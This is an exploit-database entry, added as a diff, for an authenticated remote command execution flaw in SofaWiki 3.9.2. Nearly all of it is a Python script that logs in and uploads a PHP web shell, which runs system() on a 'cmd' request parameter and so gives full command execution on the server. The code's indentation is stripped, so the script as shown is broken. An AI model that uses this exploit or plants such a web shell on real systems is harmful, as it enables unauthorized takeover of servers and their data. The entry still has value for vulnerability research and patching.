@@ -1,0 +1,89 @@
+id: 39568
+date: 04/21/2024
+title: SofaWiki 3.9.2 - Remote Command Execution (Authenticated) Exploit
+author: Ahmet Ümit BAYRAM
+cves: 
+
+# Exploit Title: SofaWiki 3.9.2 - Remote Command Execution (RCE) (Authenticated)
+# Discovered by: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.sofawiki.com
+# Software Link: https://www.sofawiki.com/site/files/snapshot.zip
+# Tested Version: v3.9.2 (latest)
+# Tested on: MacOS
+
+
+import requests
+import random
+import sys
+import time
+
+def main():
+if len(sys.argv) < 4:
+print("Usage: python exploit.py <base_url> <username> <password>")
+sys.exit(1)
+
+base_url, username, password = sys.argv[1:4]
+
+
+filename = f"{random.randint(10000, 99999)}.phtml"
+
+
+session = requests.Session()
+
+
+login_url = f"{base_url}/index.php"
+login_data = {
+"submitlogin": "Login",
+"username": username,
+"pass": password,
+"name": "SofaWiki",
+"action": "login"
+}
+print("Exploiting...")
+time.sleep(1)
+response = session.post(login_url, data=login_data)
+if "Logout" not in response.text:
+print("Login failed:", response.text)
+sys.exit()
+
+print("Login Successful")
+time.sleep(1)
+php_shell_code = """
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
+</html>
+"""
+
+print("Shell uploading...")
+time.sleep(1)
+upload_url = f"{base_url}/index.php"
+files = {
+"uploadedfile": (filename, php_shell_code, "text/php"),
+"action": (None, "uploadfile"),
+"MAX_FILE_SIZE": (None, "8000000"),
+"filename": (None, filename),
+"content": (None, "content")
+}
+response = session.post(upload_url, files=files)
+if response.status_code == 200:
+print(f"Your shell is ready: {base_url}/site/files/{filename}")
+else:
+print("Upload failed:", response.text)
+
+if __name__ == "__main__":
+main()
+
+#  0day.today [2024-04-24]  #
